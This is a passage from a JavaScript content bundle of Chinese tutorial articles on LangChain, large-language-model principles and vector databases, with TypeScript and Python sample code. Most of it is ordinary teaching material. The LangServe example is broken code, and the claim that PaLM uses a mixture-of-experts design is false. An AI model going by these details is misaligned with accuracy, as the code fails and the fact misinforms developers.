  llm: model,
  outputKey: "title",
});

// 组合成顺序链
const overallChain = new SequentialChain({
  chains: [summarizeChain, titleChain],
  inputVariables: ["text"],
  outputVariables: ["summary", "title"],
});
\`\`\`

#### 3. Agents（代理）
Agents能够根据输入动态选择要执行的动作：

**ReAct Agent（推理和行动代理）**
- 推理过程可视化
- 动作选择策略
- 工具调用机制

**Self-Asking Agent（自问自答代理）**
- 复杂问题分解
- 信息检索策略
- 答案合成机制

\`\`\`typescript
import { initializeAgentExecutorWithOptions } from "langchain/agents";
import { ChatOpenAI } from "langchain/chat_models/openai";
import { SerpAPI } from "langchain/tools";

const model = new ChatOpenAI({ temperature: 0 });
const tools = [
  new SerpAPI(process.env.SERPAPI_API_KEY, {
    gl: "us",
    hl: "en",
  }),
];

const executor = await initializeAgentExecutorWithOptions(
  tools,
  model,
  {
    agentType: "zero-shot-react-description",
    verbose: true,
  }
);

const result = await executor.call({
  input: "今天北京的天气怎么样？"
});
\`\`\`

#### 4. Memory（记忆）
LangChain提供了多种记忆管理机制：

**Buffer Memory（缓冲记忆）**
- 对话历史管理
- 上下文窗口控制
- 记忆长度限制

**Conversation Summary Memory（对话摘要记忆）**
- 长对话摘要
- 关键信息提取
- 记忆压缩优化

\`\`\`typescript
import { ConversationSummaryMemory } from "langchain/memory";
import { ChatOpenAI } from "langchain/chat_models/openai";

const model = new ChatOpenAI({ temperature: 0 });
const memory = new ConversationSummaryMemory({
  llm: model,
  memoryKey: "chat_history",
  inputKey: "input",
});

// 在链中使用记忆
const chain = new LLMChain({
  llm: model,
  prompt: new PromptTemplate({
    template: "之前的对话：{chat_history}\\n\\n用户：{input}\\nAI：",
    inputVariables: ["chat_history", "input"],
  }),
  memory,
});
\`\`\`

#### 5. Indexes（索引）
用于处理外部数据源和文档：

**Document Loaders（文档加载器）**
- PDF、Word、HTML等多种格式支持
- Web页面抓取
- 数据库连接

**Text Splitters（文本分割器）**
- 递归字符分割
- 语义分割
- 自定义分割策略

**Vector Stores（向量存储）**
- Chroma、Pinecone、Weaviate等
- 相似性搜索
- 检索增强生成（RAG）

\`\`\`typescript
import { Document } from "langchain/document";
import { RecursiveCharacterTextSplitter } from "langchain/text_splitter";
import { OpenAIEmbeddings } from "langchain/embeddings/openai";
import { Chroma } from "langchain/vectorstores/chroma";

// 加载文档
const docs: Document[] = [
  new Document({ pageContent: "这是第一个文档的内容..." }),
  new Document({ pageContent: "这是第二个文档的内容..." }),
];

// 文本分割
const textSplitter = new RecursiveCharacterTextSplitter({
  chunkSize: 1000,
  chunkOverlap: 200,
});
const splitDocs = await textSplitter.splitDocuments(docs);

// 创建向量存储
const embeddings = new OpenAIEmbeddings();
const vectorStore = await Chroma.fromDocuments(splitDocs, embeddings, {
  collectionName: "my-documents",
});

// 相似性搜索
const results = await vectorStore.similaritySearch("查询内容", 2);
\`\`\`

### 🔧 LangChain 核心组件详解

#### 1. Models（模型）
LangChain支持多种类型的AI模型：

**Chat Models（聊天模型）**
- OpenAI GPT系列
- Anthropic Claude
- Google PaLM
- 本地模型（如Llama）

\`\`\`typescript
import { ChatOpenAI } from "langchain/chat_models/openai";
import { HumanMessage, SystemMessage } from "langchain/schema";

const chat = new ChatOpenAI({
  temperature: 0.8,
  modelName: "gpt-3.5-turbo",
});

const response = await chat.call([
  new SystemMessage("你是一个专业的技术顾问"),
  new HumanMessage("请解释什么是微服务架构？")
]);
\`\`\`

**Text Completion Models（文本补全模型）**
- 传统的文本生成模型
- 编程辅助
- 内容创作

#### 2. Tools（工具）
Tools是LangChain中可被Agent调用的功能：

**内置工具**
- SerpAPI（搜索引擎）
- Calculator（计算器）
- Wikipedia（维基百科）
- Requests（HTTP请求）

**自定义工具**
- 业务逻辑封装
- API集成
- 数据库操作

\`\`\`typescript
import { DynamicTool } from "langchain/tools";

// 创建自定义工具
const customTool = new DynamicTool({
  name: "weather_api",
  description: "获取指定城市的天气信息",
  func: async (city: string) => {
    // 实际的天气API调用
    const response = await fetch(\`https://api.weather.com/v1/weather?city=\${city}\`);
    const data = await response.json();
    return \`\${city}的天气：\${data.temperature}\xb0C, \${data.condition}\`;
  },
});

// 在Agent中使用
const tools = [customTool];
const executor = await initializeAgentExecutorWithOptions(tools, model, {
  agentType: "zero-shot-react-description",
});
\`\`\`

#### 3. Output Parsers（输出解析器）
用于解析和结构化LLM的输出：

**Structured Output Parser（结构化输出解析器）**
- JSON格式验证
- 类型安全
- 错误处理

\`\`\`typescript
import { StructuredOutputParser } from "langchain/output_parsers";
import { z } from "zod";

const parser = StructuredOutputParser.fromZodSchema(
  z.object({
    mood: z.string().describe("情绪状态"),
    color: z.string().describe("代表颜色"),
    comment: z.string().describe("评论"),
  })
);

const formatInstructions = parser.getFormatInstructions();

const prompt = new PromptTemplate({
  template: "回答用户的问题。\\n{format_instructions}\\n{question}",
  inputVariables: ["question"],
  partialVariables: { format_instructions: formatInstructions },
});

const input = await prompt.format({ question: "今天感觉怎么样？" });
const response = await model.call(input);
const parsed = await parser.parse(response);
\`\`\`

### 🚀 高级应用模式

#### 1. Retrieval-Augmented Generation (RAG)
RAG结合了检索和生成的优势：

\`\`\`typescript
import { RetrievalQAChain } from "langchain/chains";
import { OpenAIEmbeddings } from "langchain/embeddings/openai";
import { Chroma } from "langchain/vectorstores/chroma";

// 创建RAG链
const vectorStore = new Chroma(new OpenAIEmbeddings(), {
  collectionName: "knowledge-base"
});

const retriever = vectorStore.asRetriever();

const qaChain = RetrievalQAChain.fromLLM(model, retriever, {
  returnSourceDocuments: true,
  verbose: true,
});

const result = await qaChain.call({
  query: "关于这个主题的具体信息是什么？"
});
\`\`\`

#### 2. Multi-Modal Applications（多模态应用）
结合文本、图像等多种输入：

**Vision-Language Models（视觉-语言模型）**
- 图像理解
- 视觉问答
- 图像生成

#### 3. Conversational AI（对话AI）
构建复杂的对话系统：

**Context Management（上下文管理）**
- 对话状态跟踪
- 意图识别
- 情感分析

\`\`\`typescript
import { ConversationChain } from "langchain/chains";

const conversation = new ConversationChain({
  llm: model,
  memory: new ConversationSummaryMemory({
    llm: model,
    memoryKey: "history",
  }),
});

// 连续对话
const response1 = await conversation.call({ input: "你好！" });
const response2 = await conversation.call({ input: "你能帮我做什么？" });
const response3 = await conversation.call({ input: "请推荐一些编程语言" });
\`\`\`

### 📊 LangChain 生态系统

#### 1. LangServe
用于部署LangChain应用的服务器：

\`\`\`python
from langserve import RemoteRunnable
from langchain.chat_models import ChatOpenAI
from langchain.prompts import ChatPromptTemplate

# 创建可部署的链
prompt = ChatPromptTemplate.from_messages([
    ("system", "你是一个友好的AI助手"),
    ("human", "{question}")
])

chain = prompt | ChatOpenAI() | StrOutputParser()

# 部署
app = FastAPI()
app.include_router(chain.with_types(input_type=str).with_config({"run_name": "llm_chain"}).bind()).as_router()
\`\`\`

#### 2. LangSmith
用于监控、调试和评估LangChain应用：

- 链执行追踪
- 性能分析
- A/B测试
- 成本监控

#### 3. LangGraph
用于构建状态图驱动的AI应用：

\`\`\`python
from langgraph.graph import StateGraph, END

class State(TypedDict):
    query: str
    documents: List[Document]
    response: str

def retrieve(state: State) -> State:
    # 检索相关文档
    docs = vector_store.similarity_search(state["query"])
    return {"documents": docs}

def generate(state: State) -> State:
    # 基于文档生成响应
    context = "\\n".join([doc.page_content for doc in state["documents"]])
    response = llm(f"基于以下信息回答：{context}\\n问题：{state['query']}")
    return {"response": response}

# 构建状态图
workflow = StateGraph(State)
workflow.add_node("retrieve", retrieve)
workflow.add_node("generate", generate)
workflow.set_entry_point("retrieve")
workflow.add_edge("retrieve", "generate")
workflow.add_edge("generate", END)

app = workflow.compile()
\`\`\`

### 🛠️ 实际应用案例

#### 1. 智能客服系统
\`\`\`typescript
import { ConversationalRetrievalQAChain } from "langchain/chains";
import { OpenAIEmbeddings } from "langchain/embeddings/openai";
import { PineconeStore } from "langchain/vectorstores/pinecone";

// 客服知识库
const embeddings = new OpenAIEmbeddings();
const vectorStore = await PineconeStore.fromExistingIndex(embeddings, {
  pineconeIndex: pineconeClient.index("customer-support"),
});

const qaChain = ConversationalRetrievalQAChain.fromLLM(
  model,
  vectorStore.asRetriever(),
  {
    returnSourceDocuments: true,
    verbose: true,
  }
);

// 处理客户咨询
const result = await qaChain.call({
  question: "我的订单什么时候能到货？",
  chat_history: [],
});
\`\`\`

#### 2. 文档分析助手
\`\`\`typescript
import { createRetrievalChain } from "langchain/chains/retrieval";
import { createStuffDocumentsChain } from "langchain/chains/combine_documents";

// 创建文档分析链
const combineDocsChain = await createStuffDocumentsChain({
  llm: model,
  documentPrompt: new PromptTemplate({
    template: "{page_content}",
    inputVariables: ["page_content"],
  }),
});

const retrievalChain = await createRetrievalChain({
  combineDocsChain,
  retriever: vectorStore.asRetriever(),
});

const result = await retrievalChain.invoke({
  input: "这份合同的主要条款是什么？"
});
\`\`\`

#### 3. 代码审查助手
\`\`\`typescript
const codeReviewPrompt = new PromptTemplate({
  template: \`请审查以下代码并提供改进建议：
  
代码：
\`\`\`{language}
{code}
\`\`\`

请关注：
1. 代码质量
2. 安全漏洞
3. 性能问题
4. 最佳实践

提供具体的改进建议：\`,
  inputVariables: ["code", "language"],
});

const codeReviewChain = new LLMChain({
  llm: model,
  prompt: codeReviewPrompt,
});

const reviewResult = await codeReviewChain.call({
  code: "// 用户提交的代码",
  language: "typescript",
});
\`\`\`

### 🚀 最佳实践

#### 1. 性能优化
- 缓存机制
- 批处理
- 异步处理
- 模型选择策略

#### 2. 错误处理
- 重试机制
- 降级策略
- 异常捕获
- 日志记录

#### 3. 安全考虑
- 输入验证
- 输出过滤
- 访问控制
- 数据脱敏

### 📈 LangChain 未来发展

#### 1. 更强的多模态支持
- 图像、音频、视频处理
- 跨模态理解
- 生成能力增强

#### 2. 更好的可观察性
- 执行追踪
- 性能监控
- 成本分析
- 调试工具

#### 3. 更丰富的生态系统
- 更多模型支持
- 更多工具集成
- 更好的部署选项
- 社区贡献

LangChain作为AI应用开发的重要框架，为开发者提供了构建复杂AI系统的强大工具集。通过合理的组件组合和链式调用，可以快速构建出功能丰富、性能优异的AI应用。随着生态系统的不断完善，LangChain将继续在AI应用开发领域发挥重要作用。`,createdAt:"2026-03-15",updatedAt:"2026-03-15"},{id:"llm-fundamentals",title:"大语言模型（LLM）核心技术原理",category:"ai",difficulty:"hard",tags:["LLM","Transformer","注意力机制","预训练","微调"],content:`## 大语言模型（LLM）核心技术原理

大语言模型（Large Language Models, LLMs）是现代人工智能领域的核心技术之一，它们通过深度学习和大规模数据训练，实现了对自然语言的深刻理解和生成能力。本文将深入探讨LLM的核心技术原理、发展历程和实现机制。

### 🧠 语言模型的发展历程

语言模型的发展经历了几个重要阶段：

#### 1. 统计语言模型
早期的语言模型基于统计方法：
- **N-gram模型**：基于马尔可夫假设，使用前N-1个词预测下一个词
- **平滑技术**：解决零概率问题，如加一平滑、Good-Turing平滑
- **局限性**：无法捕捉长距离依赖，参数空间巨大

#### 2. 神经网络语言模型
神经网络的引入带来了突破：
- **词嵌入（Word Embedding）**：将词汇映射到连续向量空间
- **循环神经网络（RNN）**：处理序列数据，捕捉上下文信息
- **长短期记忆网络（LSTM）**：解决梯度消失问题，处理长序列

#### 3. Transformer时代
Transformer架构彻底改变了语言模型：
- **注意力机制**：并行处理，捕捉全局依赖
- **自注意力**：同一序列内元素间的相互关注
- **位置编码**：保留序列位置信息

### 🔬 Transformer架构详解

Transformer是现代LLM的基础架构，由Vaswani等人在2017年提出。

#### 1. 自注意力机制（Self-Attention）
自注意力机制是Transformer的核心：

\`\`\`python
import torch
import torch.nn.functional as F

def scaled_dot_product_attention(Q, K, V, mask=None):
    """
    计算缩放点积注意力
    Q: 查询矩阵 (batch_size, seq_len, d_k)
    K: 键矩阵 (batch_size, seq_len, d_k)
    V: 值矩阵 (batch_size, seq_len, d_v)
    """
    # 计算注意力分数
    scores = torch.matmul(Q, K.transpose(-2, -1)) / math.sqrt(Q.size(-1))
    
    # 应用掩码（如果有的话）
    if mask is not None:
        scores.masked_fill_(mask == 0, -1e9)
    
    # 计算注意力权重
    attention_weights = F.softmax(scores, dim=-1)
    
    # 计算输出
    output = torch.matmul(attention_weights, V)
    
    return output, attention_weights
\`\`\`

**多头注意力（Multi-Head Attention）**：
- 并行计算多个注意力头
- 捕捉不同类型的语言关系
- 增强模型的表达能力

#### 2. 位置编码（Positional Encoding）
由于Transformer缺乏内在的位置概念，需要显式添加位置信息：

\`\`\`python
import math

def positional_encoding(seq_len, d_model):
    """
    位置编码实现
    seq_len: 序列长度
    d_model: 模型维度
    """
    pe = torch.zeros(seq_len, d_model)
    position = torch.arange(0, seq_len, dtype=torch.float).unsqueeze(1)
    
    div_term = torch.exp(torch.arange(0, d_model, 2).float() *
                        -(math.log(10000.0) / d_model))
    
    pe[:, 0::2] = torch.sin(position * div_term)
    pe[:, 1::2] = torch.cos(position * div_term)
    
    return pe.unsqueeze(0)
\`\`\`

#### 3. 前馈神经网络（Feed-Forward Network）
每个位置独立应用相同的前馈网络：

\`\`\`python
class PositionWiseFeedForward(nn.Module):
    def __init__(self, d_model, d_ff, dropout=0.1):
        super().__init__()
        self.linear1 = nn.Linear(d_model, d_ff)
        self.linear2 = nn.Linear(d_ff, d_model)
        self.dropout = nn.Dropout(dropout)
        self.activation = nn.ReLU()
    
    def forward(self, x):
        return self.linear2(self.dropout(self.activation(self.linear1(x))))
\`\`\`

### 🏗️ LLM的预训练范式

#### 1. 预训练任务
LLM通常使用以下预训练任务：

**自回归语言建模（Autoregressive LM）**：
- GPT系列采用此方法
- 从左到右预测下一个词
- 适用于生成任务

**去噪自编码（Denoising Autoencoding）**：
- BERT系列采用此方法
- 随机遮蔽部分token进行预测
- 适用于理解任务

**前缀语言建模（Prefix LM）**：
- 结合双向理解和单向生成
- 如GPT-2的变体

#### 2. 预训练数据
高质量、大规模的训练数据是LLM成功的关键：

**数据来源**：
- 网页爬取（Common Crawl, WebText）
- 书籍和文章
- 代码仓库（GitHub, Stack Overflow）
- 学术论文
- 社交媒体内容

**数据处理**：
- 文本清洗和去重
- 质量过滤
- 版权和隐私检查
- 格式标准化

#### 3. 训练策略
**课程学习（Curriculum Learning）**：
- 从简单到复杂的数据分布
- 渐进式增加难度
- 提高训练效率

**混合精度训练**：
- 使用FP16或BF16减少内存占用
- 保持训练稳定性
- 加速训练过程

### 🎯 模型微调技术

#### 1. 全量微调（Full Fine-tuning）
- 更新所有模型参数
- 最优性能但计算成本高
- 需要大量GPU资源

#### 2. 参数高效微调（Parameter-Efficient Fine-tuning）
**LoRA（Low-Rank Adaptation）**：
- 低秩分解适应
- 显著减少参数数量
- 保持原始模型不变

\`\`\`python
class LoRALayer(nn.Module):
    def __init__(self, in_features, out_features, rank, alpha):
        super().__init__()
        self.lora_A = nn.Parameter(torch.zeros(rank, in_features))
        self.lora_B = nn.Parameter(torch.zeros(out_features, rank))
        self.alpha = alpha
        self.rank = rank
        
        # 初始化
        nn.init.kaiming_uniform_(self.lora_A, a=math.sqrt(5))
        nn.init.zeros_(self.lora_B)
    
    def forward(self, x):
        return (self.alpha / self.rank) * x @ self.lora_A.T @ self.lora_B.T
\`\`\`

**Adapter Layers**：
- 插入小型适配器层
- 冻结原始参数
- 模块化微调

#### 3. 指令微调（Instruction Tuning）
- 使用指令-响应对进行训练
- 提高模型遵循指令的能力
- 如InstructGPT、Alpaca等

### 🧪 推理优化技术

#### 1. 推理加速
**KV缓存（KV Cache）**：
- 缓存注意力键值对
- 避免重复计算
- 显著提升生成速度

**投机采样（Speculative Sampling）**：
- 使用小模型预测候选序列
- 大模型验证和修正
- 提高吞吐量

#### 2. 内存优化
**FlashAttention**：
- 减少内存访问
- 提高计算效率
- 支持更长序列

**梯度检查点（Gradient Checkpointing）**：
- 用计算换内存
- 支持更大模型训练
- 控制内存峰值

### 📊 模型评估指标

#### 1. 传统指标
- **困惑度（Perplexity）**：衡量语言模型质量
- **BLEU/ROUGE**：评估生成质量
- **准确率/精确率/召回率**：分类任务指标

#### 2. LLM特有指标
**人类偏好对齐**：
- 与人类判断的相关性
- 偏好学习（Preference Learning）
- RLHF（Reinforcement Learning from Human Feedback）

**安全性评估**：
- 有害内容检测
- 偏见和公平性
- 隐私泄露风险

### 🔒 安全性和对齐

#### 1. RLHF（人类反馈强化学习）
RLHF是当前主流的对齐方法：

**奖励模型训练**：
- 人类标注偏好数据
- 训练奖励模型
- 评估模型输出质量

**PPO优化**：
- 使用奖励信号优化策略
- 平衡性能和对齐
- 避免过度优化

#### 2. 安全措施
**内容过滤**：
- 输入输出过滤器
- 有害内容检测
- 主题边界控制

**模型编辑**：
- 知识编辑技术
- 偏见消除
- 事实纠正

### 🚀 模型架构演进

#### 1. GPT系列
- **GPT-1**: 首次展示Transformer在语言建模的成功
- **GPT-2**: 多任务学习，zero-shot能力
- **GPT-3**: 175B参数，few-shot学习
- **GPT-3.5**: ChatGPT，对话能力
- **GPT-4**: 多模态，更强推理

#### 2. 其他重要架构
**PaLM（Pathways Language Model）**：
- 540B参数
- 专家混合（MoE）架构
- 代码和数学能力

**Chinchilla**：
- 优化的缩放法则
- 4倍数据，更小模型
- 数据效率优先

### 📈 训练基础设施

#### 1. 分布式训练
**数据并行**：
- 复制模型到多个设备
- 并行处理不同数据批次
- AllReduce同步梯度

**模型并行**：
- 分割模型到多个设备
- 处理超大模型
- 流水线并行优化

#### 2. 训练优化
**学习率调度**：
- 预热阶段
- 余弦退火
- 自适应调整

**正则化技术**：
- Dropout
- 权重衰减
- 梯度裁剪

### 🛠️ 实际应用考虑

#### 1. 部署策略
**模型量化**：
- INT8量化
- 混合精度
- 知识蒸馏

**服务架构**：
- 批处理优化
- 请求队列管理
- 负载均衡

#### 2. 成本效益
**硬件选择**：
- GPU/TPU比较
- 内存带宽需求
- 能耗考虑

**运营成本**：
- 训练成本
- 推理成本
- 维护开销

### 🌟 未来发展方向

#### 1. 架构创新
- 稀疏激活网络
- 动态计算路径
- 记忆增强机制

#### 2. 训练方法
- 更高效的预训练
- 持续学习
- 多任务统一

#### 3. 应用拓展
- 多模态融合
- 代理能力
- 专业化领域

大语言模型代表了人工智能发展的重要里程碑，其核心技术仍在快速发展。理解这些基础原理对于掌握和应用LLM技术至关重要。随着技术的不断进步，LLM将在更多领域发挥重要作用，推动人工智能的普及和发展。`,createdAt:"2026-03-15",updatedAt:"2026-03-15"},{id:"vector-databases",title:"向量数据库核心技术与应用实践",category:"ai",difficulty:"hard",tags:["向量数据库","相似性搜索","嵌入向量","RAG","Chroma","Pinecone"],content:`## 向量数据库核心技术与应用实践

向量数据库是现代AI应用的核心基础设施，专门用于存储、索引和检索高维向量数据。随着大语言模型和机器学习应用的普及，向量数据库已成为实现语义搜索、推荐系统、相似性匹配等功能的关键技术。

### 🧠 向量数据库的基本概念

向量数据库是一种专门设计用于处理向量数据的数据库系统。与传统的关系型数据库不同，向量数据库专注于高维向量的相似性搜索，能够快速找到与查询向量最相似的数据点。

#### 1. 向量表示
向量是多维空间中的点，通常表示为数字数组：
- **词向量**：将词汇映射到高维空间
- **句子向量**：表示整个句子的语义
- **图像向量**：图像的特征表示
- **音频向量**：声音信号的特征表示

#### 2. 相似性度量
向量数据库使用不同的距离度量来计算相似性：

**余弦相似度（Cosine Similarity）**：
\`\`\`python
import numpy as np

def cosine_similarity(a, b):
    """计算两个向量的余弦相似度"""
    dot_product = np.dot(a, b)
    norm_a = np.linalg.norm(a)
    norm_b = np.linalg.norm(b)
    return dot_product / (norm_a * norm_b)

# 示例
vec1 = np.array([1, 2, 3])
vec2 = np.array([2, 3, 4])
similarity = cosine_similarity(vec1, vec2)
print(f"余弦相似度: {similarity}")
\`\`\`

**欧几里得距离（Euclidean Distance）**：
\`\`\`python
def euclidean_distance(a, b):
    """计算两个向量的欧几里得距离"""
    return np.sqrt(np.sum((a - b) ** 2))

distance = euclidean_distance(vec1, vec2)
print(f"欧几里得距离: {distance}")
\`\`\`

**点积（Dot Product）**：
\`\`\`python
def dot_product_similarity(a, b):
    """计算点积相似度"""
    return np.dot(a, b)

dot_sim = dot_product_similarity(vec1, vec2)
print(f"点积相似度: {dot_sim}")
\`\`\`

### 🔧 核心技术原理

#### 1. 向量索引技术
向量数据库使用特殊的索引结构来加速相似性搜索：

**近似最近邻搜索（Approximate Nearest Neighbor, ANN）**：
- 精确搜索在高维空间中计算复杂度极高
- ANN算法提供近似结果，大幅提高搜索速度
- 在精度和速度之间取得平衡

**常用ANN算法**：

**IVF（Inverted File Index）**：
- 将向量空间划分为多个聚类
- 搜索时只检查相关聚类
- 减少搜索范围

\`\`\`python
from sklearn.cluster import KMeans
import numpy as np

class IVFIndex:
    def __init__(self, n_clusters=100):
        self.n_clusters = n_clusters
        self.kmeans = KMeans(n_clusters=n_clusters)
        self.clusters = {}
        self.vectors = {}
        
    def fit(self, vectors):
        """训练聚类模型"""
        self.centroids = self.kmeans.fit(vectors).cluster_centers_
        
        # 将向量分配到对应聚类
        labels = self.kmeans.predict(vectors)
        for i, label in enumerate(labels):
            if label not in self.clusters:
                self.clusters[label] = []
            self.clusters[label].append(i)
            self.vectors[i] = vectors[i]
    
    def search(self, query_vector, k=10):
        """搜索最相似的k个向量"""
        # 找到查询向量最接近的聚类
        distances = np.linalg.norm(self.centroids - query_vector, axis=1)
        closest_cluster = np.argmin(distances)
        
        # 在该聚类中搜索
        candidates = self.clusters[closest_cluster]
        similarities = []
        
        for idx in candidates:
            similarity = cosine_similarity(query_vector, self.vectors[idx])
            similarities.append((idx, similarity))
        
        # 返回最相似的k个
        similarities.sort(key=lambda x: x[1], reverse=True)
        return similarities[:k]
\`\`\`

**HNSW（Hierarchical Navigable Small World）**：
- 分层图结构
- 高效的图遍历算法
- 优秀的搜索性能

**LSH（Locality Sensitive Hashing）**：
- 哈希函数保持相似性
- 快速哈希查找
- 适合大规模数据

#### 2. 向量量化技术
为了节省存储空间和提高搜索效率，向量数据库使用量化技术：

**标量量化（Scalar Quantization）**：
- 对每个维度单独量化
- 压缩比高但精度损失较大

**乘积量化（Product Quantization）**：
- 将向量分割为子向量
- 对每个子向量独立量化
- 平衡压缩和精度

\`\`\`python
class ProductQuantizer:
    def __init__(self, m=8, k=256):
        self.m = m  # 子向量数量
        self.k = k  # 每个子向量的码本大小
        self.codebooks = None
        
    def fit(self, vectors):
        """训练乘积量化器"""
        n, d = vectors.shape
        self.d_sub = d // self.m  # 每个子向量的维度
        
        self.codebooks = np.zeros((self.m, self.k, self.d_sub))
        
        for i in range(self.m):
            start_idx = i * self.d_sub
            end_idx = (i + 1) * self.d_sub
            sub_vectors = vectors[:, start_idx:end_idx]
            
            # 对每个子向量聚类
            kmeans = KMeans(n_clusters=self.k)
            kmeans.fit(sub_vectors)
            self.codebooks[i] = kmeans.cluster_centers_
    
    def encode(self, vectors):
        """编码向量"""
        n, d = vectors.shape
        codes = np.zeros((n, self.m), dtype=np.int32)
        
        for i in range(self.m):
            start_idx = i * self.d_sub
            end_idx = (i + 1) * self.d_sub
            sub_vectors = vectors[:, start_idx:end_idx]
            
            for j in range(n):
                distances = np.linalg.norm(
                    self.codebooks[i] - sub_vectors[j], axis=1
                )
                codes[j, i] = np.argmin(distances)
        
        return codes
    
    def decode(self, codes):
        """解码向量"""
        n = codes.shape[0]
        reconstructed = np.zeros((n, self.d_sub * self.m))
        
        for i in range(self.m):
            for j in range(n):
                reconstructed[j, i*self.d_sub:(i+1)*self.d_sub] = \
                    self.codebooks[i, codes[j, i]]
        
        return reconstructed
\`\`\`

### 🏗️ 主流向量数据库

#### 1. Pinecone
Pinecone是托管的向量数据库服务：

**特点**：
- 完全托管服务
- 自动扩展
- 高可用性
- 支持多种索引类型

**使用示例**：
\`\`\`python
import pinecone

# 初始化Pinecone
pinecone.init(api_key="your-api-key", environment="us-west1-gcp")

# 创建索引
index_name = "my-index"
pinecone.create_index(index_name, dimension=1536)

# 连接到索引
index = pinecone.Index(index_name)

# 添加向量
vectors = [
    ("vec1", [0.1, 0.2, 0.3], {"metadata": "value1"}),
    ("vec2", [0.4, 0.5, 0.6], {"metadata": "value2"})
]
index.upsert(vectors=vectors)

# 查询相似向量
query_result = index.query(
    vector=[0.15, 0.25, 0.35],
    top_k=10,
    include_metadata=True
)
\`\`\`

#### 2. Weaviate
Weaviate是开源的向量数据库：

**特点**：
- GraphQL API
- 自动模式推断
- 支持多种向量索引
- 云原生架构

**使用示例**：
\`\`\`python
import weaviate

# 连接到Weaviate
client = weaviate.Client("http://localhost:8080")

# 创建类
class_obj = {
    "class": "Document",
    "properties": [
        {
            "name": "content",
            "dataType": ["string"]
        }
    ],
    "vectorizer": "none"  # 手动提供向量
}

client.schema.create_class(class_obj)

# 添加对象
client.data_object.create(
    data_object={
        "content": "这是一个文档内容"
    },
    class_name="Document",
    vector=[0.1, 0.2, 0.3]  # 提供向量
)

# 相似性搜索
near_vector = {"vector": [0.15, 0.25, 0.35]}
result = client.query.get("Document", ["content"]).with_near_vector(
    near_vector
).with_limit(10).do()
\`\`\`

#### 3. Milvus
Milvus是专为企业级应用设计的向量数据库：

**特点**：
- 高性能
- 支持多种索引类型
- 水平扩展
- 丰富的API

**使用示例**：
\`\`\`python
from pymilvus import connections, FieldSchema, CollectionSchema, DataType, Collection

# 连接Milvus
connections.connect("default", host="localhost", port="19530")

# 定义schema
fields = [
    FieldSchema(name="id", dtype=DataType.INT64, is_primary=True, auto_id=True),
    FieldSchema(name="embedding", dtype=DataType.FLOAT_VECTOR, dim=128),
    FieldSchema(name="text", dtype=DataType.VARCHAR, max_length=65535)
]
schema = CollectionSchema(fields, "文档集合")

# 创建collection
collection = Collection("docs", schema)

# 创建索引
index_params = {
    "index_type": "IVF_FLAT",
    "metric_type": "L2",
    "params": {"nlist": 100}
}
collection.create_index(field_name="embedding", index_params=index_params)

# 插入数据
entities = [
    [[0.1, 0.2, 0.3], [0.4, 0.5, 0.6]],  # embeddings
    ["文本1", "文本2"]  # texts
]
insert_result = collection.insert(entities)

# 搜索
collection.load()
search_params = {"metric_type": "L2", "params": {"nprobe": 10}}
results = collection.search(
    data=[[0.15, 0.25, 0.35]],
    anns_field="embedding",
    param=search_params,
    limit=10,
    output_fields=["text"]
)
\`\`\`

#### 4. Chroma
Chroma是简单易用的向量数据库：

**特点**：
- 轻量级
- Python原生
- 适合原型开发
- 开源免费

**使用示例**：
\`\`\`python
import chromadb
from chromadb.utils import embedding_functions

# 创建客户端
client = chromadb.Client()

# 创建集合
collection = client.create_collection("docs")

# 添加文档
collection.add(
    documents=[
        "这是一个文档",
        "这是另一个文档"
    ],
    metadatas=[
        {"source": "web"},
        {"source": "book"}
    ],
    ids=["doc1", "doc2"]
)

# 查询相似文档
results = collection.query(
    query_texts=["查询文本"],
    n_results=2
)
\`\`\`

### 🚀 RAG（检索增强生成）应用

向量数据库在RAG系统中发挥关键作用：

#### 1. RAG架构
\`\`\`python
class RAGSystem:
    def __init__(self, vector_db, llm):
        self.vector_db = vector_db
        self.llm = llm
        self.embedding_model = embedding_functions.SentenceTransformerEmbeddingFunction()
    
    def retrieve(self, query, k=5):
        """从向量数据库检索相关文档"""
        query_embedding = self.embedding_model([query])
        results = self.vector_db.query(
            query_embeddings=query_embedding,
            n_results=k
        )
        return results
    
    def generate(self, query, context):
        """基于上下文生成答案"""
        prompt = f"""
        基于以下上下文信息回答问题：
        
        上下文：{context}
        
        问题：{query}
        
        请提供准确的回答。
        """
        return self.llm.generate(prompt)
    
    def query(self, question):
        """完整RAG流程"""
        # 1. 检索相关文档
        retrieved_docs = self.retrieve(question)
        
        # 2. 构建上下文
        context = " ".join(retrieved_docs['documents'][0])
        
        # 3. 生成答案
        answer = self.generate(question, context)
        
        return {
            'answer': answer,
            'sources': retrieved_docs['metadatas'][0]
        }
\`\`\`

#### 2. 文档预处理
\`\`\`python
from langchain.text_splitter import RecursiveCharacterTextSplitter

class DocumentProcessor:
    def __init__(self):
        self.text_splitter = RecursiveCharacterTextSplitter(
            chunk_size=1000,
            chunk_overlap=200,
            separators=["\\n\\n", "\\n", " ", ""]
        )
    
    def process_document(self, text, doc_id):
        """处理文档并准备插入向量数据库"""
        chunks = self.text_splitter.split_text(text)
        
        # 为每个chunk生成向量
        embeddings = self.embedding_model(chunks)
        
        # 准备数据
        data = {
            'ids': [f"{doc_id}_{i}" for i in range(len(chunks))],
            'documents': chunks,
            'embeddings': embeddings,
            'metadatas': [{'doc_id': doc_id, 'chunk_id': i} 
                         for i in range(len(chunks))]
        }
        
        return data
\`\`\`

### 📊 性能优化策略

#### 1. 索引优化
**选择合适的索引类型**：
- **IVF_FLAT**：精确搜索，适合小规模数据
- **IVF_PQ**：乘积量化，节省存储
- **HNSW**：高性能，适合在线服务

**参数调优**：
- **nlist**：聚类数量，影响搜索精度和速度
- **efConstruction**：构建参数，影响索引质量
- **M**：HNSW参数，影响搜索效率

#### 2. 批量操作
\`\`\`python
def batch_upsert(vectors, batch_size=1000):
    """批量插入向量"""
    for i in range(0, len(vectors), batch_size):
        batch = vectors[i:i+batch_size]
        index.upsert(vectors=batch)
        print(f"已插入 {i+len(batch)} / {len(vectors)} 个向量")
\`\`\`

#### 3. 内存管理
- 合理设置缓存大小
- 及时释放不需要的资源
- 监控内存使用情况

### 🔒 安全性和可靠性

#### 1. 数据安全
**访问控制**：
- API密钥管理
- 角色权限控制
- IP白名单

**数据加密**：
- 传输加密（TLS）
- 存储加密
- 字段级加密

#### 2. 可靠性保障
**备份策略**：
- 定期快照
- 增量备份
- 跨区域复制

**监控告警**：
- 性能指标监控
- 错误率跟踪
- 资源使用监控

### 🛠️ 最佳实践

#### 1. 向量质量保证
- 使用高质量的嵌入模型
- 定期更新向量表示
- 验证向量的语义一致性

#### 2. 查询优化
- 合理设置top-k参数
